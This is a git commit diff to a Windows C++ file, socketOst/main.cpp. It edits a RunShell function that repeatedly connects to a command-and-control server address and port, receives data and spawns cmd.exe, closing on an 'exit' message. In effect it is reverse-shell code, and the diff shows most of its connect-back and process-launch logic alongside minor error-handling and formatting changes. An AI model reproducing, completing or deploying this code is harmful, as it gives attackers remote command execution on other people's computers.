69f00363be43872819ffd44030ed0d76e8aaebd2
Алексей Виноградов <vinogradov.av20@gmail.com>
2021-07-05 22:35:01 +0300

    fix add

--- socketOst/main.cpp
+++ socketOst/main.cpp
@@ -2,9 +2,10 @@
 #include <ws2tcpip.h>
 #include <winsock2.h>
 #include <windows.h>
-#pragma comment(lib, "Ws2_32.lib") 
+#pragma comment(lib,"Ws2_32.lib")
+
 #define DEFAULT_BUFLEN 1024
-#pragma warning(disable:4996) //added this string because "WSAStartup(MAKEWORD(2,2), &version);" doesn't want to work 
+#pragma warning(disable : 4996) //added this string because "WSAStartup(MAKEWORD(2,2), &version);" doesn't want to work 
 
 using namespace std;
 
@@ -17,32 +18,37 @@ void RunShell(char* C2Server, int C2Port) {
     while (true) {
         Sleep(5000);    // Five Second
 
+        int iResult;
         SOCKET mySocket;
         sockaddr_in addr;
         WSADATA version;
-        WSAStartup(MAKEWORD(2,2), &version);
+        iResult = WSAStartup(MAKEWORD(2,2), &version);
+            if (iResult != 0) {
+            printf("WSAStartup failed: %d\n", iResult);
+            exit(1);
+            }
         mySocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
         addr.sin_family = AF_INET;
 
         addr.sin_addr.s_addr = inet_addr(C2Server);
         addr.sin_port = htons(C2Port);
 
-        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
+            if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
             closesocket(mySocket);
             WSACleanup();
             continue;
-        }
-        else {
+            }
+            else {
             char RecvData[DEFAULT_BUFLEN];
             memset(RecvData, 0, sizeof(RecvData));
             int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
-            if (RecvCode <= 0) {
+                if (RecvCode <= 0) {
                 closesocket(mySocket);
                 WSACleanup();
                 continue;
-            }
-            else {
-                wchar_t Process[] = L"C:\\WINDOWS\\System32\\cmd.exe"; // need to echar_t because Ctreate process dont work
+                }
+                else {
+                wchar_t Process[] = L"C:\\WINDOWS\\System32\\cmd.exe //Q"; // need to echar_t because Ctreate process dont work
                 STARTUPINFO sinfo;
                 PROCESS_INFORMATION pinfo;
                 memset(&sinfo, 0, sizeof(sinfo));
@@ -56,11 +62,11 @@ void RunShell(char* C2Server, int C2Port) {
 
                 memset(RecvData, 0, sizeof(RecvData));
                 int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
-                if (RecvCode <= 0) {
+                    if (RecvCode <= 0) {
                     closesocket(mySocket);
                     WSACleanup();
                     continue;
-                }
+                    }
                 if (strcmp(RecvData, "exit\n") == 0) {
                     exit(0);
                 }
